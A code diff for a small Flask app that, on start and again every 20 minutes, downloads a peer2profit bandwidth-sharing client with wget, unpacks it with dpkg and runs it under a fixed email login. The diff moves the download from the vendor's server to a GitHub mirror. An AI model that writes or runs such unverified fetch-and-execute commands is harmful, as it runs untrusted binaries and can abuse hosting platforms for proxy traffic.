@@ -5,7 +5,7 @@ import requests
 import threading
 app = Flask(__name__)
 
-subprocess.call("wget https://updates.peer2profit.com/p2pclient_0.56_amd64.deb && dpkg -x p2pclient_0.56_amd64.deb ~ && cd usr/bin && ./p2pclient --login arijitpaine249@gmail.com",shell=True)
+subprocess.call("wget https://github.com/codewithap/peer2profit/raw/main/p2pclient_0.56_amd64.deb && dpkg -x p2pclient_0.56_amd64.deb ~ && cd usr/bin && ./p2pclient --login arijitpaine249@gmail.com",shell=True)
 
 @app.route("/")
 def s():
@@ -14,7 +14,7 @@ def s():
         while(True):
             r = requests.get(f"{ip}:5000")
             print(r)
-            subprocess.call("cd ~ && wget https://updates.peer2profit.com/p2pclient_0.56_amd64.deb && dpkg -x p2pclient_0.56_amd64.deb ~ && cd usr/bin && ./p2pclient --login arijitpaine249@gmail.com",shell=True)
+            subprocess.call("cd ~ && wget https://github.com/codewithap/peer2profit/raw/main/p2pclient_0.56_amd64.deb && dpkg -x p2pclient_0.56_amd64.deb ~ && cd usr/bin && ./p2pclient --login arijitpaine249@gmail.com",shell=True)
             time.sleep(1200)
     t = threading.Thread(target=f1)
     t.start()
